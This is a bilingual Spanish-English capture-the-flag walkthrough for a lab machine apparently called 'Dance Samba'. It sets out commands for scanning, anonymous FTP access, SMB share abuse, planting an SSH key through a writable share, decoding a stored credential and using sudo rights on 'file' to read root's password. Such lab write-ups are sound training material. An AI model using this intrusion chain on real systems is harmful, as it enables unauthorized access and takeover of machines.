# Quick Start Guide | Guía de Inicio Rápido

---

## ESPAÑOL

### Pasos Críticos para Resolver Dance Samba

#### 1. Escaneo Inicial
```bash
nmap -sV -p- <target_ip>
```
Identifica servicios FTP (21), SSH (22), y SMB (139/445).

#### 2. Acceso Anónimo a FTP
```bash
ftp <target_ip>
# Ingresa: anonymous (usuario) y '' (contraseña)
# Descarga la nota con: get <archivo>
```

#### 3. Enumeración SMB
```bash
smbclient -L //<target_ip>/
# Identifica el share 'macarena'
smbclient //<target_ip>/macarena
# Ingresa con las credenciales encontradas en la nota
get user.txt
```

#### 4. Inyección de Clave SSH
```bash
# Genera claves localmente
ssh-keygen -f id_rsa -P x -q
mv id_rsa.pub authorized_keys

# Crea el directorio .ssh en SMB y sube la clave
put authorized_keys

# Conecta por SSH sin contraseña
ssh -i id_rsa macarena@<target_ip>
```

#### 5. Decodificación de Credencial
```bash
# Encuentra el archivo hash en /home/macarena/secret/
cat /home/macarena/secret/<hash_file>
echo "<hash>" | base32 -d | base64 -d
```

#### 6. Escalada de Privilegios
```bash
sudo -l
# Ingresa la credencial decodificada
# Verifica que puedas usar 'file' sin contraseña
sudo file -f /opt/password.txt
# Obtén la contraseña de root
su root
```

#### 7. Bandera Final
```bash
cat /root/root.txt
```

---

## ENGLISH

### Critical Steps to Solve Dance Samba

#### 1. Initial Scan
```bash
nmap -sV -p- <target_ip>
```
Identifies FTP (21), SSH (22), and SMB (139/445) services.

#### 2. Anonymous FTP Access
```bash
ftp <target_ip>
# Enter: anonymous (username) and '' (password)
# Download the note with: get <file>
```

#### 3. SMB Enumeration
```bash
smbclient -L //<target_ip>/
# Identifies the 'macarena' share
smbclient //<target_ip>/macarena
# Enter credentials found in the note
get user.txt
```

#### 4. SSH Key Injection
```bash
# Generate keys locally
ssh-keygen -f id_rsa -P x -q
mv id_rsa.pub authorized_keys

# Create .ssh directory in SMB and upload the key
put authorized_keys

# Connect via SSH without password
ssh -i id_rsa macarena@<target_ip>
```

#### 5. Credential Decoding
```bash
# Find the hash file in /home/macarena/secret/
cat /home/macarena/secret/<hash_file>
echo "<hash>" | base32 -d | base64 -d
```

#### 6. Privilege Escalation
```bash
sudo -l
# Enter the decoded credential
# Verify you can use 'file' without password
sudo file -f /opt/password.txt
# Obtain root password
su root
```

#### 7. Final Flag
```bash
cat /root/root.txt
```

---

### Time Estimate / Tiempo Estimado
- **With this guide | Con esta guía**: 10-15 minutes
- **First attempt | Primer intento**: 30-45 minutes

### Key Concepts / Conceptos Clave
- Anonymous access exploitation
- SMB misconfiguration abuse
- SSH key injection technique
- Credential decoding and base conversion
- Sudo privilege abuse
- Privilege escalation chaining
